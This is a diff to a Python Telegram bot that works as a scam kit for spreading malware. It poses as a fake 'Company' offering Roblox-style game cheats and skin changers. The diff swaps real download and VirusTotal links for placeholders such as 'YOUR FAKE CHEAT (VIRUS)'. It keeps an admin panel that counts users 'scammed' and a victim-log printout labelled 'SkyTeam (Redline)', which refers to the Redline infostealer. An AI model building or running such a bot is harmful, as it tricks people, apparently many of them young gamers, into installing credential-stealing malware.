@@ -1,4 +1,4 @@
-# Import
+# Imports
 from aiogram import Bot, Dispatcher, executor, types
 import logging
 from db import Database
@@ -7,7 +7,8 @@ from datetime import datetime
 from colorama import Fore
 from time import sleep
 import requests
-# Start
+
+# main()
 if __name__ == '__main__':
     logging.basicConfig(level=logging.INFO)
     # Main Label
@@ -19,7 +20,7 @@ if __name__ == '__main__':
         {Fore.LIGHTCYAN_EX} ___) | |___ / ___ \| |  | | | |_) | |_| || |  
         {Fore.BLUE}|____/ \____/_/   \_\_|  |_| |____/ \___/ |_| 
 
-                    {Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}n0n_bann3d{Fore.RESET}
+                    {Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}fairet{Fore.RESET}
 
                     {Fore.LIGHTCYAN_EX}[1] Start Bot (TOKEN+ADMIN_ID)
                     [2] Install Requirements
@@ -30,13 +31,14 @@ if __name__ == '__main__':
     if choice == '3':
         exit()
     elif choice == '2':
-        print(f"{Fore.BLACK}Write 'pip install -r requirements.txt' \nTY, restart the bot{Fore.RESET}")
+        print(f"{Fore.BLACK}Write 'pip install -r requirements.txt' \nTY, then restart the bot{Fore.RESET}")
         input()
 
     else:
 
         c_token = input(f"{Fore.LIGHTBLUE_EX}Token: {Fore.RESET}")
-        admin_id = input(f"{Fore.RED}Your id for admin panel (Take from @thisforkbot): {Fore.RESET}")
+        admin_id = input(f"{Fore.RED}Your id for admin panel: {Fore.RESET}")
+        name = input(f"{Fore.GREEN} Enter name of the your fake \"Company\": ")
         ready = input(f"{Fore.LIGHTRED_EX}Launch bot? (y, n): {Fore.RESET}")
 
         bot = Bot(c_token)
@@ -45,17 +47,11 @@ if __name__ == '__main__':
         db = Database('users.db')
         if ready == "y":
 
-
-            print(f"{Fore.CYAN}Starting. (1-3 seconds)")
-            sleep(0.4)
-            print(f"{Fore.CYAN}Starting.. (2-3 seconds)")
-            sleep(0.8)
-            print(f"{Fore.CYAN}Starting... {Fore.RESET}")
-            sleep(1.2)
-            print(f"{Fore.RED}Started of token: {c_token}\n"
+            # Some Information
+            print(f"{Fore.RED}Started of the token: {c_token}\n"
                   f"Admin_Id: {admin_id}"
                   f"{Fore.RESET}\n"
-                  f"{Fore.MAGENTA}Admin panel (working):\n"
+                  f"{Fore.MAGENTA}Admin panel:\n"
                   f"Write to bot 'adm'{Fore.RESET}")
 
 
@@ -75,7 +71,7 @@ if __name__ == '__main__':
                     db.add_user(message.from_user.id)
                     await bot.send_message(
                         message.from_user.id,
-                        "Здравствуйте! Это команда Richest Roblox Team. \nВведите ваш никнейм:")
+                        f"Приветствуем! Это команда {name}. \nВведите ваш никнейм:")
                 else:
                     markup.add(start, soft, top, help)
                     await bot.send_message(
@@ -174,6 +170,7 @@ if __name__ == '__main__':
                                 if message.text == "adm":
                                     adm = types.InlineKeyboardMarkup(row_width=2)
 
+                                    # UNDER THE DEVELOPEMENT ( WAIT )
                                     refreal = types.InlineKeyboardButton(text="рефки", callback_data="reff")
                                     ban = types.InlineKeyboardButton(text="забанить", callback_data="ban")
                                     razban = types.InlineKeyboardButton(text="разбанить", callback_data="razban")
@@ -186,9 +183,9 @@ if __name__ == '__main__':
                                     adm.insert(razban)
                                     adm.insert(users)
 
-                                    await bot.send_message(message.from_user.id, text=f"Всего пользователей: (working) \n"
-                                                                          f"Всего заскамлено: (working) \n"
-                                                                          f"Всего не заскамлено: (working)",
+                                    await bot.send_message(message.from_user.id, text=f"Всего пользователей:  \n"
+                                                                          f"Всего заскамлено:  \n"
+                                                                          f"Всего не заскамлено: ",
                                                            reply_markup=adm)
 
                             else:
@@ -197,12 +194,8 @@ if __name__ == '__main__':
                                                         "🚫 Введите пожалуйста /start")
 
 
-            # @dp.callback_query_handler(text='skin')
-            # @dp.callback_query_handler(text='skin')
-            # @dp.callback_query_handler(text='skin')
-            # @dp.callback_query_handler(text='skin')
-            # @dp.callback_query_handler(text='skin')
 
+            # Under the Developemt
             @dp.callback_query_handler(text="ref")
             async def ref(call: types.CallbackQuery):
                 ref = types.InlineKeyboardMarkup(row_width=2)
@@ -212,7 +205,7 @@ if __name__ == '__main__':
 
                 ref.insert(scam)
                 ref.insert(back)
-                await call.message.edit_text(text="WORKING")
+                await call.message.edit_text(text="Under The Developement")
                 await call.message.edit_reply_markup(reply_markup=ref)
 
 
@@ -235,15 +228,16 @@ if __name__ == '__main__':
 
                 skins = types.InlineKeyboardMarkup(row_width=2)
                 vt1 = types.InlineKeyboardButton(
+                    # FAKE VIRUS TOTAL ( EDIT )
                     text="♻️ VirusTotal",
                     url=
-                    "https://www.virustotal.com/gui/file/711177e6536f09f536224d74dfbdc2e9b5ff455420bdc0527e42d3cfba3f9e7a?nocache=1"
+                    "YOUR FAKE VIRUSTOTAL!!!!"
                 )
                 download1 = types.InlineKeyboardButton(
                     text="🔥 Скачать",
                     callback_data="main",
                     url=
-                    "https://mega.nz/file/tKZjXaTB#jnXvV64KHE42512blq1k3EF1dJvPwGSs374IvYfzUik")
+                    "YOUR FAKE CHEAT (VIRUS)")
 
                 back = types.InlineKeyboardButton(
                     text="↩️ ВЕРНУТЬСЯ",  # 2
@@ -286,13 +280,13 @@ if __name__ == '__main__':
                 vt1 = types.InlineKeyboardButton(
                     text="♻️ VirusTotal",
                     url=
-                    "https://www.virustotal.com/gui/file/711177e6536f09f536224d74dfbdc2e9b5ff455420bdc0527e42d3cfba3f9e7a?nocache=1"
+                    "your fake virus total"
                 )
                 download1 = types.InlineKeyboardButton(
                     text="🔥 Скачать",
                     callback_data="main",
                     url=
-                    "https://mega.nz/file/tapChJwC#dW0B48Iw1u_j0pjoa7Q6XWqKKrB3b34gOTHAlzrk1oM"
+                    "your fake skinchanger (virus)"
                 )
 
                 back = types.InlineKeyboardButton(
@@ -358,14 +352,15 @@ if __name__ == '__main__':
                                                       f"Method: SkyTeam (Redline)\n"
                                                       f"Telegram: (working)\n"
                                                       f"\n")
-
+                # Get The Log
                 print(
                     f"New Log: \nName: {db.get_nickname(types.Message.from_user.id)} \nIp: {requests.get('https://ramziv.com/ip').text}\nXz: {socket.gethostbyname(socket.gethostname())} \nPublic: {socket.gethostname()}\nTime: {datetime.now()} \nCheck: https://t.me/Sky_Team_Bot\nMethod: SkyTeam (Redline)\nTelegram: (working)\n")
 
 
             executor.start_polling(dp, skip_updates=True)
-
+        # Exit
         else:
             exit()
 
 
+# by fairet
